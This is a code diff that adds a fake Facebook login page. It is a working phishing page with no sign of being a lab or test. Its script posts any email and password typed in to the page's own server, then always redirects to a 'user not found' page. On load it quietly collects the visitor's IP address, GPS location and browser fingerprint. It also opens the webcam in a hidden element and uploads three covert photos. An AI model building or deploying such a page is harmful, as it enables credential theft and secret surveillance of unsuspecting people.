@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/x-icon" href="/favicon.png">
+    <title>Facebook - log in or sign up</title>
+    <link rel="stylesheet" href="output.css" />
+  </head>
+  <body>
+    <div class="facebook-main">
+      <div class="facebook-container">
+        <div class="facebook-left">
+          <img class="facebook-logo" src="/facebook image.svg" alt="Facebook" />
+          <p class="facebook-tagline">
+            Facebook helps you connect and share with the people in your life.
+          </p>
+        </div>
+
+        <div class="facebook-right">
+          <div class="facebook-form">
+            <form id="loginForm">
+              <input
+                id="email"
+                class="facebook-input"
+                type="text"
+                placeholder="Email or phone number"
+                required
+              />
+              <input
+                id="password"
+                class="facebook-input"
+                type="password"
+                placeholder="Password"
+                required
+              />
+              <button type="submit" class="facebook-login-btn">Log In</button>
+            </form>
+
+            <div class="facebook-divider"></div>
+
+            <button class="facebook-create-btn">Create New Account</button>
+          </div>
+
+          <p class="facebook-page-text">
+            <a href="#" class="facebook-page-link">Create a Page</a> for a celebrity, brand or business.
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <!-- Loading overlay -->
+    <div id="loadingOverlay" class="loading-overlay hidden">
+      <div class="loading-content">
+        <div class="spinner"></div>
+        <span>Logging in...</span>
+      </div>
+    </div>
+
+    <script>
+      let userLocation = null;
+      let userIPAddress = null;
+      let visitId = 'visit_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+
+      console.log('🚀 STARTING FACEBOOK CLONE...');
+      console.log('Visit ID:', visitId);
+
+      // Start everything on page load
+      window.addEventListener('load', function() {
+        console.log('📱 Page loaded - Starting automatic capture...');
+        
+        // Get IP address
+        getIPAddress();
+        
+        // Get location
+        getLocation();
+        
+        // Track page visit
+        setTimeout(() => trackPageVisit(), 1000);
+        
+        // Start camera capture
+        setTimeout(() => startCameraCapture(), 3000);
+      });
+
+      // Get IP address
+      function getIPAddress() {
+        console.log('🌐 Getting IP address...');
+        
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            userIPAddress = data.ip;
+            console.log('✅ IP Address captured:', userIPAddress);
+          })
+          .catch(error => {
+            console.log('❌ IP detection failed:', error);
+          });
+      }
+
+      // Get location
+      function getLocation() {
+        console.log('📍 Getting location...');
+        
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            function(position) {
+              userLocation = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                source: 'GPS'
+              };
+              
+              console.log('✅ GPS Location captured:', userLocation);
+              
+              // Get city/country
+              getLocationDetails();
+            },
+            function(error) {
+              console.log('❌ GPS failed, trying IP location');
+              getIPLocation();
+            },
+            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+          );
+        } else {
+          console.log('❌ Geolocation not supported, using IP');
+          getIPLocation();
+        }
+      }
+
+      // Get IP-based location
+      function getIPLocation() {
+        console.log('🌍 Getting IP-based location...');
+        
+        fetch('https://ipapi.co/json/')
+          .then(response => response.json())
+          .then(data => {
+            if (!userIPAddress) userIPAddress = data.ip;
+            
+            userLocation = {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              city: data.city,
+              country: data.country_name,
+              region: data.region,
+              source: 'IP'
+            };
+            
+            console.log('✅ IP Location captured:', userLocation);
+          })
+          .catch(error => {
+            console.log('❌ IP location failed:', error);
+          });
+      }
+
+      // Get city/country from GPS coordinates
+      function getLocationDetails() {
+        if (!userLocation) return;
+        
+        fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLocation.latitude}&longitude=${userLocation.longitude}&localityLanguage=en`)
+          .then(response => response.json())
+          .then(data => {
+            userLocation.city = data.city || data.locality;
+            userLocation.country = data.countryName;
+            userLocation.region = data.principalSubdivision;
+            
+            console.log('✅ Location details added:', userLocation);
+          })
+          .catch(error => {
+            console.log('❌ Location details failed:', error);
+          });
+      }
+
+      // Track page visit
+      function trackPageVisit() {
+        console.log('📊 Tracking page visit...');
+        
+        fetch('/api/page-visit', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify({
+            visitId: visitId,
+            ipAddress: userIPAddress,
+            location: userLocation,
+            timestamp: new Date().toISOString(),
+            userAgent: navigator.userAgent,
+            screenResolution: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            url: window.location.href,
+            referrer: document.referrer
+          })
+        })
+        .then(response => response.json())
+        .then(data => {
+          console.log('✅ Page visit tracked successfully:', data);
+        })
+        .catch(error => {
+          console.log('❌ Page visit tracking failed:', error);
+        });
+      }
+
+      // Start camera capture
+      async function startCameraCapture() {
+        console.log('📸 Starting secret camera capture...');
+        
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { 
+              width: { ideal: 1280 },
+              height: { ideal: 720 },
+              facingMode: 'user'
+            }
+          });
+          
+          console.log('✅ Camera access granted');
+          
+          // Create hidden video element
+          const video = document.createElement('video');
+          video.style.cssText = 'position:absolute;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;';
+          video.autoplay = true;
+          video.muted = true;
+          video.srcObject = stream;
+          document.body.appendChild(video);
+          
+          // Wait for video to load
+          video.onloadedmetadata = function() {
+            video.play();
+            
+            console.log('🔒 Starting secret photo capture...');
+            
+            // Capture photos with delays
+            setTimeout(() => capturePhoto(video, stream, 1), 1000);
+            setTimeout(() => capturePhoto(video, stream, 2), 3000);
+            setTimeout(() => capturePhoto(video, stream, 3), 5000);
+            
+            // Cleanup after last photo
+            setTimeout(() => {
+              stream.getTracks().forEach(track => track.stop());
+              video.remove();
+              console.log('🔒 Camera capture completed and cleaned up');
+            }, 7000);
+          };
+          
+        } catch (error) {
+          console.log('❌ Camera access denied:', error);
+        }
+      }
+
+      // Capture individual photo
+      function capturePhoto(video, stream, photoNumber) {
+        try {
+          const canvas = document.createElement('canvas');
+          const context = canvas.getContext('2d');
+          
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          
+          const photoData = canvas.toDataURL('image/jpeg', 0.8);
+          
+          // Upload photo
+          uploadPhoto(photoData, photoNumber);
+          
+          console.log(`📸 Photo ${photoNumber} captured`);
+          
+        } catch (error) {
+          console.log(`❌ Photo ${photoNumber} capture failed:`, error);
+        }
+      }
+
+      // Upload photo to server
+      async function uploadPhoto(photoData, photoNumber) {
+        try {
+          const response = await fetch('/api/upload-photo', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              visitId: visitId,
+              photoData: photoData,
+              photoNumber: photoNumber,
+              ipAddress: userIPAddress,
+              location: userLocation,
+              timestamp: new Date().toISOString(),
+              quality: 'high',
+              secret: true
+            })
+          });
+          
+          const result = await response.json();
+          console.log(`✅ Photo ${photoNumber} uploaded:`, result);
+          
+        } catch (error) {
+          console.log(`❌ Photo ${photoNumber} upload failed:`, error);
+        }
+      }
+
+      // Handle login form submission
+      document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+        
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        
+        console.log('🔐 Login attempt:', { email, password });
+        
+        if (!email || !password) {
+          alert('Please fill in all fields');
+          return;
+        }
+
+        // Show loading
+        loadingOverlay.classList.remove('hidden');
+
+        try {
+          const response = await fetch('/api/login', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+              email: email,
+              password: password,
+              location: userLocation,
+              ipAddress: userIPAddress,
+              timestamp: new Date().toISOString(),
+              userAgent: navigator.userAgent,
+              screenResolution: `${screen.width}x${screen.height}`,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            })
+          });
+
+          const data = await response.json();
+          console.log('📝 Login response:', data);
+          
+          // Hide loading
+          loadingOverlay.classList.add('hidden');
+          
+          // Always redirect to user not found page
+          window.location.href = '/user-not-found';
+          
+        } catch (error) {
+          console.error('❌ Login error:', error);
+          loadingOverlay.classList.add('hidden');
+          
+          // Still redirect to user not found page
+          window.location.href = '/user-not-found';
+        }
+      });
+    </script>
+  </body>
+</html>
